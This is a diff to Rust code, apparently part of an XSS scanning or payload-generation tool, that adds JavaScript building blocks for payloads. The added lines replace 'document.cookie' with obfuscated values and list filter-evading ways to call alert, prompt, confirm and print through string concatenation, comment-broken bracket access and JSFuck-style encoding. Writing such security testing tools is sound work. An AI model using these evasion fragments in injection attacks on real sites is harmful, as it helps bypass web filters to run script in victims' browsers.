@@ -1,14 +1,24 @@
 pub fn get_jsvalue() -> Vec<String> {
         vec![
-                "document.cookie".to_string(),
+                "(+{}+[])[+!![]]".to_string(),
+                "/XSS/.source".to_string(),
             ]
 }
 
 pub fn get_jscmd() -> Vec<String> {
         vec![
+            "parent['con'+'firm']".to_string(),
+            "parent['prom'+'pt']".to_string(),
+            "parent['ale'+'rt']".to_string(),
+            "globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]".to_string(),
             "alert".to_string(),
             "prompt".to_string(),
             "confirm".to_string(),
+            "this[/*foo*/'alert'/*bar*/]".to_string(),
+            "this[/*foo*/'print'/*bar*/]".to_string(),
+            "window[/*foo*/'confirm'/*bar*/]".to_string(),
+            "self[/*foo*/'prompt'/*bar*/]".to_string(),
+            "window['ale'+'rt']".to_string(),
             ]
 }
 
